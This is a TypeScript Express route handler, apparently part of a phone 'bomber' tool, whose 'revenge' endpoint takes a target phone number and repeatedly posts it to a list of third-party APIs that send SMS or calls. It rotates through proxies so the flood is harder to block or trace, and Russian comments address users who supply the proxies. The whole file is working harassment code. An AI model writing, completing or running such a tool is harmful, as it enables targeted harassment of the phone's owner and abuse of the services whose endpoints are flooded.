import axios from "axios";
import Express from "express";
import colors from "colors";
import { HttpsProxyAgent } from "https-proxy-agent";
import { changePhone, bombapis, formatePhone, slicePhone } from "../API's/api's.ts";

const revengeRouter: Express.Router = Express.Router();

const proxies: string[] = [
    // Ваши прокси, деточки!
];

let currentProxyIndex = 0;

async function isProxyValid(proxy: string): Promise<boolean> {
    try {
        const agent = new HttpsProxyAgent(proxy);
        await axios.get("https://api.ipify.org?format=json", {
            // httpsAgent: agent, // Тут, нужно раскомментировать, дабы работало проксирование.
            timeout: 5000,
            proxy: false,
        });
        return true;
    } catch (error) {
        return false;
    }
}

async function getNewProxy(): Promise<string> {
    const total = proxies.length;
    for (let i = 0; i < total; i++) {
        const proxy = proxies[currentProxyIndex];
        currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
        console.log("Проверяем прокси:", proxy);
        if (await isProxyValid(proxy)) {
            console.log(colors.green(`Прокси ${proxy} валиден.`));
            return proxy;
        } else {
            console.log(colors.red(`Прокси ${proxy} не прошёл проверку.`));
        }
    }
    throw new Error("Нет валидных прокси.");
}

revengeRouter.post("/", async (req, res) => {
    console.log(req.body);

    let responsePayload: any = [];

    const updatedPhone = changePhone(req.body.phone);
    console.log("Updated phone:", updatedPhone);

    for (let i = 0; i < req.body.streams; i++) {
        try {
            const promises = bombapis.APIs.map(async (API, index) => {

                const key = Object.keys(API.payload)[0];
                API.payload[key] = API.formate ? formatePhone(updatedPhone) : API.slice ? slicePhone(updatedPhone) : updatedPhone;
                console.log(API.payload[key]);

                const proxyUrl = await getNewProxy();
                const agent = new HttpsProxyAgent(proxyUrl);
                console.log("Используем прокси:", proxyUrl);

                const headers = {
                    ...bombapis.headers,
                    Origin: API.origin,
                    Referer: API.referer,
                };

                console.log(API.payload);
                console.log("Запрос на:", API.url);
                try {
                    const result = await axios.post(
                        API.url,
                        API.payload,
                        {
                            headers,
                            httpsAgent: agent,
                            timeout: 10000,
                            proxy: false,
                        }
                    );
                    console.log(colors.bgGreen(`Ответ от ${API.name}: `), result.data);
                    return { name: API.name, status: "fulfilled", data: result.data };
                } catch (error: any) {
                    console.error(colors.bgRed(`Ошибка при запросе ${API.name}: ${error.message}`));
                    return { name: API.name, status: "rejected", reason: error.message };
                }

            });

            const results = await Promise.allSettled(promises);

            responsePayload = [
                ...responsePayload,
                ...results.map((r, i) => {
                    if (r.status === "fulfilled") {
                        return r.value;
                    } else {
                        return { name: bombapis.APIs[i].name, status: "rejected", reason: r.reason };
                    }
                }),
            ];
        } catch (err: any) {
            console.error("Ошибка запроса:", err.response?.data || err.message);
            res.status(err.response?.status || 500).send(err.response?.data || err.message);
            return;
        }
    }

    res.status(200).json({
        bombapis,
        results: responsePayload
    });
});

export default revengeRouter;
